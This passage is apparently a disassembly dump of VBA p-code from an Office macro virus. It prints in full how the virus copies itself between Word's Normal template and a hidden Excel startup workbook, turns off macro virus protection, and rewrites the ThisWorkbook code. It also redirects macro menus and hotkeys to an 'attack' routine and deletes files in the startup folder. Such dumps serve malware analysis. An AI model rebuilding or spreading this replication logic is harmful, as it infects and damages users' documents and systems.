' 	Ld Asal 
' 	Ld Tujuan 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	ArgsLd EIKModul 0x0003 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St KompProject 
' 	EndIf 
' Line #111:
' 	EndIfBlock 
' Line #112:
' 	Label salah 
' Line #113:
' 	EndFunc 
' Line #114:
' 	FuncDefn (Sub RemoveAll())
' Line #115:
' 	OnError (Resume Next) 
' Line #116:
' 	SetStmt 
' 	Ld Documents 
' 	Set ctl 
' Line #117:
' 	StartForVariable 
' 	Ld ctl 
' 	EndForVariable 
' 	Ld Documents 
' 	ForEach 
' Line #118:
' 	Ld ctl 
' 	Ld ActiveDocument 
' 	Ne 
' 	IfBlock 
' Line #119:
' 	Ld ActiveDocument 
' 	Ld ctl 
' 	ArgsCall KompProject 0x0002 
' Line #120:
' 	Ld ctl 
' 	MemLd Path 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ctl 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #121:
' 	EndIfBlock 
' Line #122:
' 	StartForVariable 
' 	Ld ctl 
' 	EndForVariable 
' 	NextVar 
' Line #123:
' 	EndSub 
' Line #124:
' 	FuncDefn (Function PrintOke() As Boolean)
' Line #125:
' 	Dim (Const) 
' 	LitStr 0x0004 "cPrt"
' 	VarDefn CP
' Line #126:
' 	OnError salah 
' Line #127:
' 	Ld KeyWord 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld GetCreator 
' 	LitVarSpecial (True)
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #128:
' 	LitVarSpecial (True)
' 	St PrintOke 
' Line #129:
' 	ElseBlock 
' Line #130:
' 	Ld CP 
' 	Ld CusProp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Value 
' 	LitDI2 0x0002 
' 	Lt 
' 	IfBlock 
' Line #131:
' 	Ld CP 
' 	Ld CusProp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Value 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld CP 
' 	Ld CusProp 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Value 
' Line #132:
' 	Ld regApp 
' 	Ld regSecSet 
' 	Ld CP 
' 	ArgsLd GetSetting 0x0003 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0032 
' 	Le 
' 	IfBlock 
' Line #133:
' 	Ld regApp 
' 	Ld regSecSet 
' 	Ld CP 
' 	Ld regApp 
' 	Ld regSecSet 
' 	Ld CP 
' 	ArgsLd GetSetting 0x0003 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsCall SaveSetting 0x0004 
' Line #134:
' 	LitVarSpecial (True)
' 	St PrintOke 
' Line #135:
' 	EndIfBlock 
' Line #136:
' 	EndIfBlock 
' Line #137:
' 	EndIfBlock 
' Line #138:
' 	Label salah 
' Line #139:
' 	EndFunc 
' Line #140:
' 	FuncDefn (Sub FilePrint())
' Line #141:
' 	OnError (Resume Next) 
' Line #142:
' 	Ld PrintOke 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0058 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0058 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Display 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Serang 0x0000 
' 	EndIf 
' 	EndIf 
' Line #143:
' 	EndSub 
' Line #144:
' 	FuncDefn (Sub FilePrintDefault())
' Line #145:
' 	ArgsCall FilePrint 0x0000 
' Line #146:
' 	EndSub 
' Line #147:
' 	FuncDefn (Sub ToolsCustomizeKeyboard())
' Line #148:
' 	ArgsCall Serang 0x0000 
' Line #149:
' 	EndSub 
' Line #150:
' 	FuncDefn (Sub ViewCode())
' Line #151:
' 	ArgsCall Serang 0x0000 
' Line #152:
' 	EndSub 
' Line #153:
' 	FuncDefn (Sub ViewVbCode())
' Line #154:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000D "AuthorKeyWord"
' 	ArgsLd GetSetting 0x0003 
' 	LitStr 0x0006 "Marsel"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall Serang 0x0000 
' 	EndIf 
' Line #155:
' 	EndSub 
' Line #156:
' 	FuncDefn (Sub ToolsCustomize())
' Line #157:
' 	ArgsCall Serang 0x0000 
' Line #158:
' 	EndSub 
' Line #159:
' 	FuncDefn (Sub FormatStyle())
' Line #160:
' 	Ld KeyWord 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x00B4 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall Serang 0x0000 
' 	EndIf 
' Line #161:
' 	EndSub 
' Line #162:
' 	FuncDefn (Sub ToolsRecordMacroToggle())
' Line #163:
' 	ArgsCall Serang 0x0000 
' Line #164:
' 	EndSub 
' Line #165:
' 	FuncDefn (Sub ToolsMacro())
' Line #166:
' 	ArgsCall Serang 0x0000 
' Line #167:
' 	EndSub 
' Line #168:
' 	FuncDefn (Sub FileTemplates())
' Line #169:
' 	ArgsCall Serang 0x0000 
' Line #170:
' 	EndSub 
' Line #171:
' 	FuncDefn (Private Sub ExportXls())
' Line #172:
' 	Dim 
' 	VarDefn xlsApp
' Line #173:
' 	Dim 
' 	VarDefn strFile (As String)
' Line #174:
' 	OnError (Resume Next) 
' Line #175:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0011 "Excel.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set xlsApp 
' Line #176:
' 	Ld xlsApp 
' 	LitNothing 
' 	Is 
' 	IfBlock 
' Line #177:
' 	SetStmt 
' 	LitStr 0x0011 "Excel.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set xlsApp 
' Line #178:
' 	Ld xlsApp 
' 	LitNothing 
' 	Is 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	GoSub CheckXls 
' 	BoS 0x0034 
' 	Ld xlsApp 
' 	MemLd Application 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #179:
' 	ElseBlock 
' Line #180:
' 	GoSub CheckXls 
' Line #181:
' 	EndIfBlock 
' Line #182:
' 	ExitSub 
' Line #183:
' 	Label CheckXls 
' Line #184:
' 	Ld xlsApp 
' 	MemLd StartupPath 
' 	Ld xlsApp 
' 	MemLd PathSeparator 
' 	Concat 
' 	ArgsCall RemStartUp 0x0001 
' Line #185:
' 	Ld blnXls 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #186:
' 	Ld xlsApp 
' 	MemLd Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #187:
' 	Ld xlsApp 
' 	MemLd StartupPath 
' 	Ld xlsApp 
' 	MemLd PathSeparator 
' 	Concat 
' 	Ld fStartUp 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	St strFile 
' Line #188:
' 	Ld strFile 
' 	Ld xlsApp 
' 	MemLd ActiveWorkbook 
' 	ArgsMemCall SaveAs 0x0001 
' Line #189:
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	St tempPath 
' Line #190:
' 	Ld NormalTemplate 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Ld xlsApp 
' 	ArgsMemLd Workbooks 0x0001 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	ArgsCall EIKModul 0x0003 
' Line #191:
' 	Ld TempVer 
' 	Ld Ver 
' 	Concat 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Ld xlsApp 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemSt New 
' Line #192:
' 	LitVarSpecial (False)
' 	Ld xlsApp 
' 	MemLd ActiveWindow 
' 	MemSt Visible 
' Line #193:
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Ld xlsApp 
' 	ArgsMemLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #194:
' 	EndIfBlock 
' Line #195:
' 	Return 
' Line #196:
' 	EndSub 
' Line #197:
' 	FuncDefn (Sub ExportDok())
' Line #198:
' 	Dim 
' 	VarDefn dokApp
' Line #199:
' 	OnError (Resume Next) 
' Line #200:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set dokApp 
' Line #201:
' 	Ld dokApp 
' 	LitNothing 
' 	Is 
' 	IfBlock 
' Line #202:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set dokApp 
' Line #203:
' 	Ld dokApp 
' 	LitNothing 
' 	Is 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	GoSub CheckDoc 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld dokApp 
' 	MemLd Application 
' 	ArgsMemCall Quit 0x0001 
' 	EndIf 
' Line #204:
' 	ElseBlock 
' Line #205:
' 	GoSub CheckDoc 
' Line #206:
' 	EndIfBlock 
' Line #207:
' 	ExitSub 
' Line #208:
' 	Label CheckDoc 
' Line #209:
' 	Ld Application 
' 	MemLd TemplatesPath 
' 	St tempPath 
' Line #210:
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	ArgsLd Workbooks 0x0001 
' 	Ld dokApp 
' 	MemLd NormalTemplate 
' 	ArgsCall KompProject 0x0002 
' Line #211:
' 	Ld dokApp 
' 	MemLd StartupPath 
' 	Ld dokApp 
' 	MemLd PathSeparator 
' 	Concat 
' 	ArgsCall RemStartUp 0x0001 
' Line #212:
' 	Return 
' Line #213:
' 	EndSub 
' Line #214:
' 	FuncDefn (Sub Auto_Open())
' Line #215:
' 	OnError (Resume Next) 
' Line #216:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #217:
' 	ArgsCall XlsActive 0x0000 
' Line #218:
' 	ArgsCall ExportDok 0x0000 
' Line #219:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #220:
' 	EndSub 
' Line #221:
' 	FuncDefn (Private Sub AllWorkBook())
' Line #222:
' 	LitVarSpecial (False)
' 	St blnMod 
' Line #223:
' 	StartForVariable 
' 	Ld Komp 
' 	EndForVariable 
' 	Ld Workbooks 
' 	ForEach 
' Line #224:
' 	Ld Komp 
' 	MemLd New 
' 	St actWindow 
' Line #225:
' 	Ld actWindow 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St blnMod 
' 	EndIf 
' Line #226:
' 	Ld Komp 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd StartupPath 
' 	Eq 
' 	Ld actWindow 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #227:
' 	LitVarSpecial (False)
' 	Ld Komp 
' 	ArgsMemCall Close 0x0001 
' Line #228:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	Ld actWindow 
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #229:
' 	EndIfBlock 
' Line #230:
' 	StartForVariable 
' 	Ld Komp 
' 	EndForVariable 
' 	NextVar 
' Line #231:
' 	Ld blnMod 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall BuatXlsActive 0x0000 
' 	EndIf 
' Line #232:
' 	EndSub 
' Line #233:
' 	FuncDefn (Sub XlsActive())
' Line #234:
' 	OnError (Resume Next) 
' Line #235:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #236:
' 	ArgsCall CreateEvents 0x0000 
' Line #237:
' 	ArgsCall TempActive 0x0000 
' Line #238:
' 	ArgsCall AllWorkBook 0x0000 
' Line #239:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt OnSheetActivate 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt OnSheetDeactivate 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt OnWindow 
' Line #240:
' 	ArgsCall MenuExcel 0x0000 
' Line #241:
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	LitStr 0x000A "!XlsActive"
' 	Concat 
' 	Ld Application 
' 	MemSt OnWindow 
' Line #242:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #243:
' 	EndSub 
' Line #244:
' 	FuncDefn (Sub TempActive())
' Line #245:
' 	OnError (Resume Next) 
' Line #246:
' 	ArgsCall Aplikasi 0x0000 
' Line #247:
' 	Ld Temp 
' 	Ld Active 
' 	ArgsLd KompProject 0x0002 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #248:
' 	ArgsCall SetCusProp 0x0000 
' Line #249:
' 	Ld MacName 
' 	Ld Active 
' 	MemLd VBProject 
' 	MemSt New 
' Line #250:
' 	Ld Active 
' 	MemLd Path 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Active 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #251:
' 	EndIfBlock 
' Line #252:
' 	EndSub 
' Line #253:
' 	FuncDefn (Function EIKModul(Asal, Tujuan, Komp As String) As Boolean)
' Line #254:
' 	OnError salah 
' Line #255:
' 	Ld tempPath 
' 	Ld Komp 
' 	Concat 
' 	Ld Komp 
' 	Ld Asal 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #256:
' 	Ld tempPath 
' 	Ld Komp 
' 	Concat 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #257:
' 	LitVarSpecial (True)
' 	St EIKModul 
' Line #258:
' 	Ld tempPath 
' 	Ld Komp 
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #259:
' 	Label salah 
' Line #260:
' 	EndFunc 
' Line #261:
' 	FuncDefn (Sub OpenFile())
' Line #262:
' 	OnError (Resume Next) 
' Line #263:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #264:
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #265:
' 	ArgsCall XlsActive 0x0000 
' Line #266:
' 	EndSub 
' Line #267:
' 	FuncDefn (Private Sub CreateEvents())
' Line #268:
' 	Dim 
' 	VarDefn vbComp
' Line #269:
' 	OnError salah 
' Line #270:
' 	Label Lanjut 
' Line #271:
' 	LitStr 0x0005 "Event"
' 	Ld ActiveWorkbook 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Value 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Ne 
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #272:
' 	OnError FatalError 
' Line #273:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set vbComp 
' Line #274:
' 	StartWithExpr 
' 	Ld vbComp 
' 	With 
' Line #275:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #276:
' 	LitDI2 0x0001 
' 	LitStr 0x0033 "Private Sub Workbook_BeforePrint(Cancel As Boolean)"
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #277:
' 	LitDI2 0x0002 
' 	LitStr 0x0014 "On Error Resume Next"
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #278:
' 	LitDI2 0x0003 
' 	LitStr 0x0018 "If PrintOke = False Then"
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #279:
' 	LitDI2 0x0004 
' 	LitStr 0x000A "    Serang"
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #280:
' 	LitDI2 0x0005 
' 	LitStr 0x0011 "    Cancel = True"
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #281:
' 	LitDI2 0x0006 
' 	LitStr 0x0006 "End if"
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #282:
' 	LitDI2 0x0007 
' 	LitStr 0x0007 "End Sub"
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #283:
' 	EndWith 
' Line #284:
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0005 "Event"
' 	Ld ActiveWorkbook 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Value 
' Line #285:
' 	EndIfBlock 
' Line #286:
' 	Label FatalError 
' Line #287:
' 	ExitSub 
' Line #288:
' 	Label salah 
' Line #289:
' 	LitStr 0x0005 "Event"
' 	Paren 
' 	LitVarSpecial (False)
' 	LitDI2 0x0004 
' 	LitStr 0x0000 ""
' 	Ld ActiveWorkbook 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' Line #290:
' 	Resume Lanjut 
' Line #291:
' 	EndSub 
' Line #292:
' 	FuncDefn (Sub BuatXlsActive())
' Line #293:
' 	Dim 
' 	VarDefn Baru (As String)
' Line #294:
' 	OnError (Resume Next) 
' Line #295:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #296:
' 	Ld Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #297:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	Ld fStartUp 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	St Baru 
' Line #298:
' 	Ld Baru 
' 	Ld ActiveWorkbook 
' 	ArgsMemCall SaveAs 0x0001 
' Line #299:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #300:
' 	ArgsCall ActiveTemp 0x0000 
' Line #301:
' 	EndSub 
' Line #302:
' 	FuncDefn (Sub ActiveTemp())
' Line #303:
' 	OnError (Resume Next) 
' Line #304:
' 	ArgsCall Aplikasi 0x0000 
' Line #305:
' 	Ld Active 
' 	Ld Temp 
' 	ArgsLd KompProject 0x0002 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #306:
' 	Ld TempVer 
' 	Ld Ver 
' 	Concat 
' 	Ld Temp 
' 	MemLd VBProject 
' 	MemSt New 
' Line #307:
' 	Ld Temp 
' 	ArgsMemCall Save 0x0000 
' Line #308:
' 	LitVarSpecial (True)
' 	St blnFound 
' Line #309:
' 	EndIfBlock 
' Line #310:
' 	EndSub 
' Line #311:
' 	FuncDefn (Sub MenuExcel())
' Line #312:
' 	OnError (Resume Next) 
' Line #313:
' 	StartForVariable 
' 	Ld ctl 
' 	EndForVariable 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	Ld CommandBars 
' 	MemLd ActiveMenuBar 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemLd Controls 
' 	ForEach 
' Line #314:
' 	LitStr 0x0006 "Serang"
' 	Ld ctl 
' 	MemSt OnAction 
' Line #315:
' 	StartForVariable 
' 	Ld ctl 
' 	EndForVariable 
' 	NextVar 
' Line #316:
' 	ArgsCall WordExcel 0x0000 
' Line #317:
' 	LitStr 0x0009 "View Code"
' 	LitStr 0x0003 "Ply"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #318:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #319:
' 	LitStr 0x0006 "%{F11}"
' 	LitStr 0x0006 "Serang"
' 	ArgsMemCallWith OnKey 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0005 "%{F8}"
' 	LitStr 0x0006 "Serang"
' 	ArgsMemCallWith OnKey 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0005 "%{F2}"
' 	LitStr 0x0006 "Serang"
' 	ArgsMemCallWith OnKey 0x0002 
' Line #320:
' 	LitStr 0x0005 "%{F4}"
' 	LitStr 0x0006 "Serang"
' 	ArgsMemCallWith OnKey 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0005 "{F12}"
' 	LitStr 0x0006 "Serang"
' 	ArgsMemCallWith OnKey 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0004 "^{o}"
' 	LitStr 0x0008 "OpenFile"
' 	ArgsMemCallWith OnKey 0x0002 
' Line #321:
' 	EndWith 
' Line #322:
' 	LitStr 0x0008 "OpenFile"
' 	LitStr 0x0004 "Open"
' 	LitStr 0x0008 "Standard"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #323:
' 	LitStr 0x0008 "OpenFile"
' 	LitStr 0x0007 "Open..."
' 	LitStr 0x0004 "File"
' 	LitStr 0x0012 "Worksheet Menu Bar"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #324:
' 	LitVarSpecial (False)
' 	LitStr 0x0009 "Unhide..."
' 	LitStr 0x0006 "Window"
' 	LitStr 0x0012 "Worksheet Menu Bar"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #325:
' 	EndSub 
' Line #326:
' 	FuncDefn (Sub WordExcel())
' Line #327:
' 	OnError (Resume Next) 
' Line #328:
' 	LitStr 0x000F "Control Toolbox"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' Line #329:
' 	LitStr 0x0005 "Forms"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' Line #330:
' 	LitStr 0x000F "ActiveX Control"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' Line #331:
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' Line #332:
' 	Ld CommandBars 
' 	MemLd ActiveMenuBar 
' 	LitVarSpecial (False)
' 	ArgsCall cmdBars 0x0002 
' Line #333:
' 	LitStr 0x000A "Formatting"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (False)
' 	ArgsCall cmdBars 0x0002 
' Line #334:
' 	LitStr 0x0008 "Standard"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (False)
' 	ArgsCall cmdBars 0x0002 
' Line #335:
' 	EndSub 
' Line #336:
' 	FuncDefn (Sub cmdBars(cmd, blnVis As Boolean))
' Line #337:
' 	StartWithExpr 
' 	Ld cmd 
' 	With 
' Line #338:
' 	Ld blnVis 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #339:
' 	LitVarSpecial (False)
' 	MemStWith Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemStWith Visible 
' 	BoS 0x0000 
' 	LitDI2 0x0008 
' 	MemStWith Protection 
' Line #340:
' 	EndIfBlock 
' Line #341:
' 	LitDI2 0x0001 
' 	MemStWith Protection 
' Line #342:
' 	EndWith 
' Line #343:
' 	EndSub 
' Line #344:
' 	FuncDefn (Sub MenuWord())
' Line #345:
' 	OnError (Resume Next) 
' Line #346:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #347:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #348:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #349:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #350:
' 	LitDI2 0x0000 
' 	MemStWith SaveInterval 
' Line #351:
' 	EndWith 
' Line #352:
' 	LitDI2 0x0400 
' 	LitDI2 0x0077 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #353:
' 	LitDI2 0x0400 
' 	LitDI2 0x0070 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #354:
' 	ArgsCall WordExcel 0x0000 
' Line #355:
' 	EndSub 
' Line #356:
' 	FuncDefn (Sub SetCusProp())
' Line #357:
' 	OnError (Resume Next) 
' Line #358:
' 	SetStmt 
' 	Ld Active 
' 	MemLd CustomDocumentProperties 
' 	Set CusProp 
' Line #359:
' 	LitStr 0x0006 "Author"
' 	LitVarSpecial (False)
' 	LitDI2 0x0004 
' 	LitStr 0x0000 ""
' 	Ld CusProp 
' 	ArgsMemCall Add 0x0004 
' 	BoS 0x0000 
' 	LitStr 0x0004 "cPrt"
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld CusProp 
' 	ArgsMemCall Add 0x0004 
' Line #360:
' 	Ld PWords 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0004 "Lina"
' 	LitStr 0x0006 "Author"
' 	Ld CusProp 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Value 
' 	EndIf 
' Line #361:
' 	EndSub 
' Line #362:
' 	FuncDefn (Function GetCreator() As Boolean)
' Line #363:
' 	OnError salah 
' Line #364:
' 	ArgsCall Aplikasi 0x0000 
' Line #365:
' 	SetStmt 
' 	Ld Active 
' 	MemLd CustomDocumentProperties 
' 	Set CusProp 
' Line #366:
' 	LitStr 0x0006 "Author"
' 	Ld CusProp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Value 
' 	LitStr 0x0004 "Lina"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St GetCreator 
' 	EndIf 
' Line #367:
' 	Label salah 
' Line #368:
' 	EndFunc 
' Line #369:
' 	FuncDefn (Function PWords() As Boolean)
' Line #370:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000D "AuthorKeyWord"
' 	ArgsLd GetSetting 0x0003 
' 	LitStr 0x0006 "Marsel"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PWords 
' 	EndIf 
' Line #371:
' 	EndFunc 
' Line #372:
' 	FuncDefn (Sub FoundIt())
' Line #373:
' 	Label TempActive 
' 	LitVarSpecial (False)
' 	St blnFound 
' Line #374:
' 	EndSub 
' Line #375:
' 	FuncDefn (Function Tator() As Boolean)
' Line #376:
' 	Ld KeyWord 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	Ld GetCreator 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Tator 
' 	EndIf 
' Line #377:
' 	EndFunc 
' Line #378:
' 	FuncDefn (Sub Aplikasi())
' Line #379:
' 	Ld Application 
' 	MemLd New 
' 	LitStr 0x000E "Microsoft Word"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Doc 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall Xls 0x0000 
' 	EndIf 
' Line #380:
' 	EndSub 
' Line #381:
' 	FuncDefn (Sub Doc())
' Line #382:
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	St tempPath 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Active 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Temp 
' Line #383:
' 	EndSub 
' Line #384:
' 	FuncDefn (Sub Xls())
' Line #385:
' 	SetStmt 
' 	Ld ActiveWorkbook 
' 	Set Active 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	ArgsLd Workbooks 0x0001 
' 	Set Temp 
' 	BoS 0x0000 
' 	Ld Application 
' 	MemLd TemplatesPath 
' 	St tempPath 
' Line #386:
' 	EndSub 
' Line #387:
+----------+--------------------+---------------------------------------------+
